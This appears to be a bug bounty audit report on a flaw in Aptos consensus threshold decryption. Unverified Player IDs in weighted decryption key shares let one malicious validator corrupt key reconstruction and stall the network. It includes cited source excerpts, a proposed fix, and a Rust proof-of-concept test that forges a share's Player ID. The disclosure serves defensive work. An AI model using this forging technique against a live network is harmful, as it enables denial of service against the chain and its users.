# Audit Report

## Title
Player ID Spoofing in Weighted Decryption Key Shares Causes Consensus Liveness Failure

## Summary
A critical authentication bypass exists in the weighted batch encryption scheme used by Aptos consensus for encrypted transaction decryption. The Player ID field in `WeightedBIBEDecryptionKeyShare` is not verified during share validation, allowing a malicious validator to forge Player IDs. This causes incorrect Lagrange interpolation during reconstruction, producing an invalid decryption key and preventing the network from decrypting transactions, resulting in total consensus liveness failure.

## Finding Description

The vulnerability exists due to a disconnect between what is cryptographically verified and what is trusted during reconstruction:

**Verification Phase (No Player ID Check):** [1](#0-0) 

The verification function ignores the Player ID from the decryption key share (`dk_share.0`) and only uses the verification key's own Player ID (`self.weighted_player`). The cryptographic signature components are verified, but the Player ID field itself is never authenticated.

**Type Definition (Unprotected Tuple):** [2](#0-1) 

The `WeightedBIBEDecryptionKeyShare` is a simple tuple where anyone can set the Player ID to any value. The `player()` method directly returns this unverified field.

**Consensus Integration (Trusted Without Validation):** [3](#0-2) 

When validators receive shares from peers, verification uses the `author` field to select the verification key, but the Player ID inside the `share` field is never validated to match the author. During aggregation, these unverified Player IDs are passed directly to reconstruction.

**Reconstruction Phase (Trusts Forged Player ID):** [4](#0-3) 

The reconstruction algorithm trusts the Player ID from each share tuple to compute virtual player mappings and Lagrange coefficients. A forged Player ID causes `get_virtual_player(player, pos)` to return wrong virtual player IDs, which are then used for Shamir interpolation.

**Lagrange Coefficient Computation (Uses Wrong Indices):** [5](#0-4) 

The reconstruction extracts Player IDs via `p.get_id()` and uses them as indices into the evaluation domain. Forged Player IDs cause wrong Lagrange coefficients to be computed, resulting in an incorrect reconstructed secret.

**Attack Scenario:**

1. Malicious Validator A derives a legitimate decryption key share for a digest
2. Before broadcasting, Validator A modifies the share tuple from `(PlayerA, [signatures])` to `(PlayerB, [signatures])` where PlayerB is a different validator's Player ID
3. Other validators receive this share in a `SecretShare` message with `author = ValidatorA`
4. Verification succeeds because it uses ValidatorA's verification key (selected by `author` field) and only checks the cryptographic signatures, ignoring the Player ID
5. During reconstruction, the forged `PlayerB` ID is used to compute virtual players and Lagrange coefficients
6. Wrong coefficients are multiplied with share values, producing an invalid decryption key
7. All validators fail to decrypt encrypted transactions in the block
8. Consensus cannot progress - **total network liveness failure**

## Impact Explanation

This vulnerability qualifies as **Critical Severity** under Aptos bug bounty criteria:

- **Total loss of liveness/network availability**: A single Byzantine validator can prevent the network from decrypting transactions by providing shares with forged Player IDs. Since consensus requires threshold decryption of encrypted transactions to proceed, this causes complete consensus stall.

- **Consensus Safety violation**: The mismatch between verified identity (via `author` field) and reconstructed identity (via Player ID in share tuple) violates the fundamental cryptographic assumption that Shamir secret sharing reconstruction uses authenticated share indices.

This breaks **Invariant #2** (Consensus Safety - AptosBFT must maintain liveness under < 1/3 Byzantine faults) and **Invariant #10** (Cryptographic Correctness - all security-critical fields must be authenticated).

## Likelihood Explanation

**Likelihood: High**

- **Attacker Requirements**: Only requires one malicious validator within the Byzantine threshold (< 1/3 of stake), which is the standard threat model for BFT systems
- **Complexity**: Trivial - simply modify a single field (Player ID) in a tuple before broadcasting
- **Detection Difficulty**: The attack produces cryptographically valid shares that pass all verification checks; only detected when reconstruction fails
- **Impact Scope**: Single attacker can DoS the entire network

## Recommendation

**Fix: Enforce Player ID Authentication During Verification**

Add a check in the verification function to ensure the Player ID in the share matches the expected player:

```rust
// In WeightedBIBEVerificationKey::verify_decryption_key_share
pub fn verify_decryption_key_share(
    &self,
    digest: &Digest,
    dk_share: &WeightedBIBEDecryptionKeyShare,
) -> Result<()> {
    // ADD THIS CHECK: Verify Player ID matches verification key's player
    if dk_share.0 != self.weighted_player {
        return Err(BatchEncryptionError::PlayerIdMismatchError.into());
    }
    
    (self.vks_g2.len() == dk_share.1.len())
        .then_some(())
        .ok_or(BatchEncryptionError::DecryptionKeyVerifyError)?;

    self.vks_g2
        .iter()
        .map(|vk_g2| BIBEVerificationKey {
            mpk_g2: self.mpk_g2,
            vk_g2: *vk_g2,
            player: self.weighted_player,
        })
        .zip(&dk_share.1)
        .try_for_each(|(vk, dk_share)| {
            vk.verify_decryption_key_share(digest, &(self.weighted_player, dk_share.clone()))
        })
}
```

Additionally, add validation in `SecretShare::verify()`:

```rust
pub fn verify(&self, config: &SecretShareConfig) -> anyhow::Result<()> {
    let index = config.get_id(self.author());
    let decryption_key_share = self.share().clone();
    
    // Verify Player ID matches author's expected player ID
    let expected_player = config.config.get_player(index);
    if decryption_key_share.player() != expected_player {
        return Err(anyhow!("Player ID mismatch: share contains player {:?} but author maps to {:?}", 
            decryption_key_share.player(), expected_player));
    }
    
    config.verification_keys[index]
        .verify_decryption_key_share(&self.metadata.digest, &decryption_key_share)?;
    Ok(())
}
```

## Proof of Concept

```rust
#[test]
fn test_player_id_spoofing_attack() {
    use crate::schemes::fptx_weighted::{FPTXWeighted, WeightedBIBEDecryptionKeyShare};
    use crate::traits::BatchThresholdEncryption;
    use aptos_crypto::weighted_config::WeightedConfigArkworks;
    use ark_std::rand::thread_rng;

    let mut rng = thread_rng();
    let tc = WeightedConfigArkworks::new(3, vec![1, 2, 5]).unwrap();

    // Setup encryption scheme
    let (ek, dk, vks, msk_shares) =
        FPTXWeighted::setup_for_testing(0, 8, 1, &tc).unwrap();

    // Encrypt a transaction
    let plaintext = String::from("secret transaction");
    let associated_data = String::from("metadata");
    let ct = FPTXWeighted::encrypt(&ek, &mut rng, &plaintext, &associated_data).unwrap();

    // Compute digest
    let (digest, _) = FPTXWeighted::digest(&dk, &vec![ct.clone()], 0).unwrap();

    // Honest validators derive their shares
    let mut dk_shares: Vec<WeightedBIBEDecryptionKeyShare> = msk_shares
        .iter()
        .map(|msk| msk.derive_decryption_key_share(&digest).unwrap())
        .collect();

    // All shares verify correctly
    for (share, vk) in dk_shares.iter().zip(&vks) {
        assert!(FPTXWeighted::verify_decryption_key_share(vk, &digest, share).is_ok());
    }

    // ATTACK: Malicious validator 0 forges Player ID to be validator 1
    let malicious_share = &mut dk_shares[0];
    let original_player = malicious_share.0;
    let forged_player = tc.get_player(1); // Spoof to different validator
    malicious_share.0 = forged_player;

    // Forged share STILL passes verification (vulnerability!)
    assert!(FPTXWeighted::verify_decryption_key_share(&vks[0], &digest, malicious_share).is_ok(),
        "VULNERABILITY: Forged Player ID passes verification!");

    // But reconstruction will fail or produce wrong key
    let result = FPTXWeighted::reconstruct_decryption_key(&dk_shares, &tc);
    
    // Either reconstruction fails, or produces wrong key that can't decrypt
    match result {
        Ok(wrong_key) => {
            // Try to decrypt - should fail
            let prepared = ct.prepare(&digest, &FPTXWeighted::eval_proofs_compute_all(
                &FPTXWeighted::digest(&dk, &vec![ct.clone()], 0).unwrap().1, &dk)).unwrap();
            let decrypt_result: Result<String, _> = wrong_key.decrypt(&prepared);
            assert!(decrypt_result.is_err() || decrypt_result.unwrap() != plaintext,
                "VULNERABILITY: Wrong decryption key produced");
        }
        Err(_) => {
            // Reconstruction fails due to invalid player combinations
            println!("VULNERABILITY: Reconstruction failed due to forged Player ID");
        }
    }

    // Restore original to show honest case works
    malicious_share.0 = original_player;
    let honest_key = FPTXWeighted::reconstruct_decryption_key(&dk_shares, &tc).unwrap();
    let prepared = ct.prepare(&digest, &FPTXWeighted::eval_proofs_compute_all(
        &FPTXWeighted::digest(&dk, &vec![ct.clone()], 0).unwrap().1, &dk)).unwrap();
    let decrypted: String = honest_key.decrypt(&prepared).unwrap();
    assert_eq!(decrypted, plaintext, "Honest case should succeed");
}
```

## Notes

This vulnerability demonstrates a critical failure in the cryptographic protocol design: the Player ID field that determines Lagrange interpolation indices must be authenticated, but currently only the signature components are verified. The attack doesn't require stealing keys or bypassing cryptographic primitives - it exploits the missing validation of a critical protocol field that affects consensus liveness.

### Citations

**File:** crates/aptos-batch-encryption/src/schemes/fptx_weighted.rs (L38-44)
```rust
pub type WeightedBIBEDecryptionKeyShare = (Player, Vec<BIBEDecryptionKeyShareValue>);

impl DecryptionKeyShare for WeightedBIBEDecryptionKeyShare {
    fn player(&self) -> Player {
        self.0
    }
}
```

**File:** crates/aptos-batch-encryption/src/schemes/fptx_weighted.rs (L149-169)
```rust
    pub fn verify_decryption_key_share(
        &self,
        digest: &Digest,
        dk_share: &WeightedBIBEDecryptionKeyShare,
    ) -> Result<()> {
        (self.vks_g2.len() == dk_share.1.len())
            .then_some(())
            .ok_or(BatchEncryptionError::DecryptionKeyVerifyError)?;

        self.vks_g2
            .iter()
            .map(|vk_g2| BIBEVerificationKey {
                mpk_g2: self.mpk_g2,
                vk_g2: *vk_g2,
                player: self.weighted_player, // arbitrary
            })
            .zip(&dk_share.1)
            .try_for_each(|(vk, dk_share)| {
                vk.verify_decryption_key_share(digest, &(self.weighted_player, dk_share.clone()))
            })
    }
```

**File:** types/src/secret_sharing.rs (L75-99)
```rust
    pub fn verify(&self, config: &SecretShareConfig) -> anyhow::Result<()> {
        let index = config.get_id(self.author());
        let decryption_key_share = self.share().clone();
        // TODO(ibalajiarun): Check index out of bounds
        config.verification_keys[index]
            .verify_decryption_key_share(&self.metadata.digest, &decryption_key_share)?;
        Ok(())
    }

    pub fn aggregate<'a>(
        dec_shares: impl Iterator<Item = &'a SecretShare>,
        config: &SecretShareConfig,
    ) -> anyhow::Result<DecryptionKey> {
        let threshold = config.threshold();
        let shares: Vec<SecretKeyShare> = dec_shares
            .map(|dec_share| dec_share.share.clone())
            .take(threshold as usize)
            .collect();
        let decryption_key =
            <FPTXWeighted as BatchThresholdEncryption>::reconstruct_decryption_key(
                &shares,
                &config.config,
            )?;
        Ok(decryption_key)
    }
```

**File:** crates/aptos-crypto/src/weighted_config.rs (L423-450)
```rust
    fn reconstruct(
        sc: &WeightedConfigArkworks<F>,
        shares: &[ShamirShare<Self::ShareValue>],
    ) -> anyhow::Result<Self> {
        let mut flattened_shares = Vec::with_capacity(sc.get_total_weight());

        // println!();
        for (player, sub_shares) in shares {
            // println!(
            //     "Flattening {} share(s) for player {player}",
            //     sub_shares.len()
            // );
            for (pos, share) in sub_shares.iter().enumerate() {
                let virtual_player = sc.get_virtual_player(player, pos);

                // println!(
                //     " + Adding share {pos} as virtual player {virtual_player}: {:?}",
                //     share
                // );
                // TODO(Performance): Avoiding the cloning here might be nice
                let tuple = (virtual_player, share.clone());
                flattened_shares.push(tuple);
            }
        }
        flattened_shares.truncate(sc.get_threshold_weight());

        SK::reconstruct(sc.get_threshold_config(), &flattened_shares)
    }
```

**File:** crates/aptos-crypto/src/arkworks/shamir.rs (L305-330)
```rust
impl<T: WeightedSum> Reconstructable<ShamirThresholdConfig<T::Scalar>> for T {
    type ShareValue = T;

    // Can receive more than `sc.t` shares, but will only use the first `sc.t` shares for efficiency
    fn reconstruct(
        sc: &ShamirThresholdConfig<T::Scalar>,
        shares: &[ShamirShare<Self::ShareValue>],
    ) -> Result<Self> {
        if shares.len() < sc.t {
            Err(anyhow!(
                "Incorrect number of shares provided, received {} but expected at least {}",
                shares.len(),
                sc.t
            ))
        } else {
            let (roots_of_unity_indices, bases): (Vec<usize>, Vec<Self::ShareValue>) = shares
                [..sc.t]
                .iter()
                .map(|(p, g_y)| (p.get_id(), g_y))
                .collect();

            let lagrange_coeffs = sc.lagrange_for_subset(&roots_of_unity_indices);

            Ok(T::weighted_sum(&bases, &lagrange_coeffs))
        }
    }
```
